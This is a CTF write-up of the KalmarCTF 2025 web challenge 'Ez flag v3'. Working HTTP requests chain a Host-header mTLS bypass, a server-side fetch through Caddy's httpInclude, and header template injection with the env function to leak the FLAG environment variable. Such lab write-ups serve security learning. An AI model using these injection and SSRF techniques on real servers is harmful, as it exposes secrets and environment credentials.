---
title: KalmarCTF - Ez flag v3 - web - 93 solves
published: true
category: web
tags: [ssti, caddy]
difficulty: easy
seo_description: "KalmarCTF 2025 Ez flag v3 challenge writeup. Caddy server template injection via httpInclude to leak environment variable FLAG using env directive."
seo_keywords:
  - KalmarCTF 2025
  - Ez flag v3 writeup
  - CTF writeup
  - web security
  - Caddy server
  - template injection
  - httpInclude SSRF
  - environment variable leak
  - Caddyfile exploitation
---

# Ez flag v3 - web

- Challenge description:

> To get the flag, you need: the mTLS cert, connecting from localhost, ... and break physics? Should be easy!
>
> Challenge note: the handout files contains tls internal while the hosted challenge mostly use real TLS.
>
> NOTE: Remote is working as intended! Even with the redirects.

- Number of solves: `93`
- Points: `146`

---

**notice: all `\{\{` and `\}\}` were without a backslash, but jekyll breaks when including raw double curly braces**

## The Challenge

The whole challenge is a `Caddyfile` which is a config adapter for [Caddy](https://caddyserver.com/):

```Caddyfile
{
        debug
        servers  {
                strict_sni_host insecure_off
        }
}

*.caddy.chal-kalmarc.tf {
        tls internal
        redir public.caddy.chal-kalmarc.tf
}

public.caddy.chal-kalmarc.tf {
        tls internal
        respond "PUBLIC LANDING PAGE. NO FUN HERE."
}

private.caddy.chal-kalmarc.tf {
        # Only admin with local mTLS cert can access
        tls internal {
                client_auth {
                        mode require_and_verify
                        trust_pool pki_root {
                                authority local
                        }
                }
        }

        # ... and you need to be on the server to get the flag
        route /flag {
                @denied1 not remote_ip 127.0.0.1
                respond @denied1 "No ..."

                # To be really really sure nobody gets the flag
                @denied2 `1 == 1`
                respond @denied2 "Would be too easy, right?"

                # Okay, you can have the flag:
                respond {$FLAG}
        }
        templates
        respond /cat     `\{\{ cat "HELLO" "WORLD" \}\}`
        respond /fetch/* `\{\{ httpInclude "/{http.request.orig_uri.path.1}" \}\}`
        respond /headers `\{\{ .Req.Header | mustToPrettyJson \}\}`
        respond /ip      `\{\{ .ClientIP \}\}`
        respond /whoami  `\{http.auth.user.id\}`
        respond "UNKNOWN ACTION"
}
```

I opened up burp, went to the challenge url, sent the request to the repeater, stripped it from all of its headers and that's how I started working with the challenge.

Request:

```
GET /public.caddy.chal-kalmarc.tf HTTP/2
Host: caddy.chal-kalmarc.tf

```

Response:

```
HTTP/2 302 Found
Alt-Svc: h3=":443"; ma=2592000
Location: public.caddy.chal-kalmarc.tf
Server: Caddy
Content-Length: 0
Date: Sat, 15 Mar 2025 13:02:37 GMT

```

As you can see all of the fun igoing on in `private.caddy.chall-kalmarc.tf {` block:

```
private.caddy.chal-kalmarc.tf {
        # Only admin with local mTLS cert can access
        tls internal {
                client_auth {
                        mode require_and_verify
                        trust_pool pki_root {
                                authority local
                        }
                }
        }

        # ... and you need to be on the server to get the flag
        route /flag {
                @denied1 not remote_ip 127.0.0.1
                respond @denied1 "No ..."

                # To be really really sure nobody gets the flag
                @denied2 `1 == 1`
                respond @denied2 "Would be too easy, right?"

                # Okay, you can have the flag:
                respond {$FLAG}
        }
        templates
        respond /cat     `\{\{ cat "HELLO" "WORLD" \}\}`
        respond /fetch/* `\{\{ httpInclude "/{http.request.orig_uri.path.1}" \}\}`
        respond /headers `\{\{ .Req.Header | mustToPrettyJson \}\}`
        respond /ip      `\{\{ .ClientIP \}\}`
        respond /whoami  `{http.auth.user.id}`
        respond "UNKNOWN ACTION"
}
```

Let's change the `Host` header and try accessing it _(the actual target is still https://caddy.chall-kalmarc.tf)_:

Request:

```
GET / HTTP/2
Host: private.caddy.chal-kalmarc.tf

```

Response:

```
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Content-Type: text/plain; charset=utf-8
Server: Caddy
Content-Length: 14
Date: Sat, 15 Mar 2025 13:04:00 GMT

UNKNOWN ACTION
```

Success! We got the execution of the last directive:

```Caddyfile
respond "UNKNOWN ACTION"
```

which means we bypassed the first validation:

```Caddyfile
# Only admin with local mTLS cert can access
tls internal {
        client_auth {
                mode require_and_verify
                trust_pool pki_root {
                        authority local
                }
        }
}
```

Great! If we try to access the flag directly:

```Caddyfile
route /flag {
        @denied1 not remote_ip 127.0.0.1
        respond @denied1 "No ..."

        # To be really really sure nobody gets the flag
        @denied2 `1 == 1`
        respond @denied2 "Would be too easy, right?"

        # Okay, you can have the flag:
        respond {$FLAG}
}
```

we can see that unless we have the actual remote_ip equal to the loopback address of the server, we will get the response `No ...`. Let's just make sure that happens:

Request:

```
GET /flag HTTP/2
Host: private.caddy.chal-kalmarc.tf

```

Response:

```
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Content-Type: text/plain; charset=utf-8
Server: Caddy
Content-Length: 6
Date: Sat, 15 Mar 2025 13:06:16 GMT

No ...
```

Alright. Let's see the templates and try to guess what they do:

```
templates
respond /cat     `\{\{ cat "HELLO" "WORLD" \}\}` << responds with HELLO WORLD
respond /fetch/* `\{\{ httpInclude "/{http.request.orig_uri.path.1}" \}\}` << probably creates another request via `httpInclude` directive to a path that is specified after /fetch/HERE_PATH
respond /headers `\{\{ .Req.Header | mustToPrettyJson \}\}` << responds with the headers sent with the request
respond /ip      `\{\{ .ClientIP \}\}` << responds with the client ip address
respond /whoami  `{http.auth.user.id}` << not useful as there's no auth here.
```

So that would mean that if we send a request to `/fetch/flag` we will bypass the next validation, as the request would be sent from the server by the `httpInclude` directive:

Request:

```
GET /fetch/flag HTTP/2
Host: private.caddy.chal-kalmarc.tf

```

Response:

```
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Content-Type: text/plain; charset=utf-8
Server: Caddy
Content-Length: 25
Date: Sat, 15 Mar 2025 13:11:25 GMT

Would be too easy, right?
```

That's right! So now we have a way to send requests to the server from the server. Let's try to see what headers does the server use for `httpInclude` requests:

Request:

```
GET /fetch/headers HTTP/2
Host: private.caddy.chal-kalmarc.tf

```

Response:

```
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Content-Type: text/plain; charset=utf-8
Server: Caddy
Content-Length: 89
Date: Sat, 15 Mar 2025 13:12:06 GMT

{
  "Accept-Encoding": [
    "identity"
  ],
  "Caddy-Templates-Include": [
    "1"
  ]
}
```

After reading [Caddy source code](https://github.com/caddyserver/caddy/) I checked that `Caddy-Templates-Include` header is just a check for recursive requests limit, that just fails the request if it reaches 3.

Regarding the last check:

```
@denied2 `1 == 1`
```

it seems that it's not bypassable in the `/flag` route. Let's see if we can somehow include `FLAG` environment variable in the response of `/fetch/headers` as it displays our headers in the caddy `httpInclude` directive.

Request:

```
GET /fetch/headers HTTP/2
Host: private.caddy.chal-kalmarc.tf
Caddy-Templates-Include: 1
My-Header: $FLAG

```

Response:

```
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Content-Type: text/plain; charset=utf-8
Server: Caddy
Content-Length: 123
Date: Sat, 15 Mar 2025 13:15:47 GMT

{
  "Accept-Encoding": [
    "identity"
  ],
  "Caddy-Templates-Include": [
    "2"
  ],
  "My-Header": [
    "$FLAG"
  ]
}
```

Not really.. But maybe it should be in curly braces so that evaluates instead of being passed as a string? Let's try it:

Request:

```
GET /fetch/headers HTTP/2
Host: private.caddy.chal-kalmarc.tf
Caddy-Templates-Include: 1
My-Header: \{\{ $FLAG \}\}

```

Response:

```
HTTP/2 500 Internal Server Error
Alt-Svc: h3=":443"; ma=2592000
Content-Type: text/plain; charset=utf-8
Server: Caddy
Content-Length: 0
Date: Sat, 15 Mar 2025 13:16:59 GMT

```

Something triggered an internal server error! Let's see, if we can at least execute some caddy directives like `cat` _(raw `"` quotes result in internal server error so I used backticks instead)_:

Request:

```
GET /fetch/headers HTTP/2
Host: private.caddy.chal-kalmarc.tf
Caddy-Templates-Include: 1
My-Header: \{\{ cat `hi` \}\}

```

Response:

```
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Content-Type: text/plain; charset=utf-8
Server: Caddy
Content-Length: 120
Date: Sat, 15 Mar 2025 13:18:42 GMT

{
  "Accept-Encoding": [
    "identity"
  ],
  "Caddy-Templates-Include": [
    "2"
  ],
  "My-Header": [
    "hi"
  ]
}
```

It worked! So we can have caddy directives but referencing the flag via $ doesn't. Let's see what directives is caddy specifically adding in [their source code for templates](https://github.com/caddyserver/caddy/blob/220cd1c2bcecc07bcf6a0141069538c1b1109907/modules/caddyhttp/templates/templates.go#L40). There it is:

```
// ##### `env`
//
// Gets an environment variable.
//
```

our flag is passed in as an environment variable via the dockerfile:

```Dockerfile
FROM caddy:2.9.1-alpine
COPY Caddyfile /etc/caddy/Caddyfile

ENV FLAG='kalmar{test}'
```

Let's try to include the `env` directive instead of `cat`:

Request:

```
GET /fetch/headers HTTP/2
Host: private.caddy.chal-kalmarc.tf
Caddy-Templates-Include: 1
My-Header: \{\{ env `FLAG` \}\}

```

Response:

```
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Content-Type: text/plain; charset=utf-8
Server: Caddy
Content-Length: 163
Date: Sat, 15 Mar 2025 13:23:47 GMT

{
  "Accept-Encoding": [
    "identity"
  ],
  "Caddy-Templates-Include": [
    "2"
  ],
  "My-Header": [
    "kalmar{4n0th3r_K4lmarCTF_An0Th3R_C4ddy_Ch4ll}"
  ]
}
```

and we got the flag!

> kalmar{4n0th3r_K4lmarCTF_An0Th3R_C4ddy_Ch4ll}
